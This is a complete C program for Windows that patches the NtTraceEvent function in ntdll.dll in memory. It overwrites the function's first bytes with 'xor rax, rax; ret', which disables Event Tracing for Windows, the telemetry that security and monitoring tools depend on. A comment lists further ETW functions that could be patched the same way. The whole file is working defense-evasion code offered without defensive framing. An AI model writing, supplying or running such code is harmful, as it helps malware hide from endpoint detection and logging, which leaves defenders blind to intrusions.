#include <windows.h>
#include <stdio.h>


// Other ETW functions
// ETWEventWrite
// ETWEventWriteFull
// ETWEventWriteEx
// ETWEventWriteTransfer
// ETWNotificationRegister

VOID PrintBytes( PVOID pAddress, SIZE_T size ) {
    BYTE* pBytes = ( BYTE* )pAddress;
    for ( SIZE_T i = 0; i < size; i++ ) {
        printf( "%02X ", pBytes[ i ] );
    }
    printf( "\n" );
}

int main( void ) {
    HMODULE hNtdll = GetModuleHandleA( "ntdll.dll" );
    if ( hNtdll == NULL ) {
        printf( "Failed to get handle for ntdll.dll\n" );
        return 1;
    }

    printf( "Ntdll.dll loaded at 0x%p\n", hNtdll );

    PVOID pNtTraceEvent = ( PVOID )GetProcAddress( hNtdll, "NtTraceEvent" );
    if ( pNtTraceEvent == NULL ) {
        printf( "Failed to get address for NtTraceEvent\n" );
        return 1;
    }

    printf( "NtTraceEvent address: 0x%p\n", pNtTraceEvent );

    printf( "Original bytes: " );
    PrintBytes( pNtTraceEvent, 5 );

    BYTE patchBytes[] = {
        0x48, 0x33, 0xC0, // xor rax, rax
        0xC3              // ret
    };

    DWORD oldProtect;
    if ( !VirtualProtect( pNtTraceEvent, sizeof( patchBytes ), PAGE_EXECUTE_READWRITE, &oldProtect ) ) {
        printf( "Failed to change memory protection\n" );
        return 1;
    }

    if ( !WriteProcessMemory( GetCurrentProcess(), pNtTraceEvent, patchBytes, sizeof( patchBytes ), NULL ) ) {
        printf( "Failed to write patch bytes\n" );
        return 1;
    }

    if ( !VirtualProtect( pNtTraceEvent, sizeof( patchBytes ), oldProtect, &oldProtect ) ) {
        printf( "Failed to restore memory protection\n" );
        return 1;
    }

    printf( "[+] Successfully patched NtTraceEvent\n" );

    printf( "Patched bytes: " );
    PrintBytes( pNtTraceEvent, sizeof( patchBytes ) );

    system( "pause" );
    return 0;
}